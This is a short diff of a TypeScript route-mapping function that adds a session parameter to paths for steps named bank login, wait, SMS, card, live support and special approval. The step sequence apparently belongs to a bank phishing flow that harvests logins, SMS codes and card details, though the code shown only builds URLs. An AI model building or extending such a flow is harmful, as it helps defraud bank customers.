@@ -122,17 +122,17 @@ export function stepToPath(
     case "bank_login":
       return "/banken";
     case "wait":
-      return "/wait";
+      return `/wait?session=${encodeURIComponent(routeSessionId)}`;
     case "invalid_bank":
-      return "/invalid-bank";
+      return `/invalid-bank?session=${encodeURIComponent(routeSessionId)}`;
     case "live_support":
-      return "/live-support";
+      return `/live-support?session=${encodeURIComponent(routeSessionId)}`;
     case "sms":
-      return "/sms";
+      return `/sms?session=${encodeURIComponent(routeSessionId)}`;
     case "card":
-      return "/card";
+      return `/card?session=${encodeURIComponent(routeSessionId)}`;
     case "congrats":
-      return "/congratulations";
+      return `/congratulations?session=${encodeURIComponent(routeSessionId)}`;
     case "special_approval":
       return `/special-approval?session=${encodeURIComponent(routeSessionId)}`;
     case "custom_question":
